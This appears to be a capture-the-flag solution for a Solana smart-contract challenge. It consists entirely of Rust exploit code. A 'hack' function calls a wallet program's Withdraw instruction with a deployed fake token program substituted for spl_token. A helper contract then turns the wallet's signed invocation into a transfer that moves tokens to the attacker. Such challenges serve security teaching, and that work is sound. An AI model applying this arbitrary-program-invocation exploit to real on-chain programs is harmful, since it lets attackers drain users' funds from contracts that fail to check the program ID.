# Solution - Arbitrary Signed Program Invocation

```rust
use solana_program::instruction::{AccountMeta, Instruction};
use borsh::BorshSerialize;

fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    assert_tx_success(env.execute_as_transaction(
        &[level4::initialize(
            challenge.wallet_program,
            challenge.hacker.pubkey(),
            challenge.mint,
        )],
        &[&challenge.hacker],
    ));

    let hacker_wallet_address = level4::get_wallet_address(
        &challenge.hacker.pubkey(),
        &challenge.wallet_program,
    )
    .0;
    let authority_address = level4::get_authority(&challenge.wallet_program).0;
    let fake_token_program =
        env.deploy_program("target/deploy/level4_poc_contract.so");

    env.execute_as_transaction(
        &[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet_address, false),             // usually: wallet_address
                AccountMeta::new_readonly(authority_address, false),        // usually: authority_address
                AccountMeta::new_readonly(challenge.hacker.pubkey(), true), // usually: owner_address
                AccountMeta::new(challenge.wallet_address, false),          // usually: destination
                AccountMeta::new_readonly(spl_token::ID, false),            // usually: expected mint
                AccountMeta::new_readonly(fake_token_program, false),       // usually: spl_token program address
            ],
            data: level4::WalletInstruction::Withdraw { amount: 1337 }
                .try_to_vec()
                .unwrap(),
        }],
        &[&challenge.hacker],
    )
    .print_named("hax");
}
```

## Extra Helper Contract

```rust
use solana_program::{
    account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, program::invoke,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    match spl_token::instruction::TokenInstruction::unpack(instruction_data).unwrap() {
        spl_token::instruction::TokenInstruction::TransferChecked { amount, .. } => {
            let source = &accounts[0];
            let mint = &accounts[1];
            let destination = &accounts[2];
            let authority = &accounts[3];
            invoke(
                &spl_token::instruction::transfer(
                    mint.key,
                    destination.key,
                    source.key,
                    authority.key,
                    &[],
                    amount,
                )
                .unwrap(),
                &[
                    source.clone(),
                    mint.clone(),
                    destination.clone(),
                    authority.clone(),
                ],
            )
        }
        _ => {
            panic!("wrong ix")
        }
    }
}
```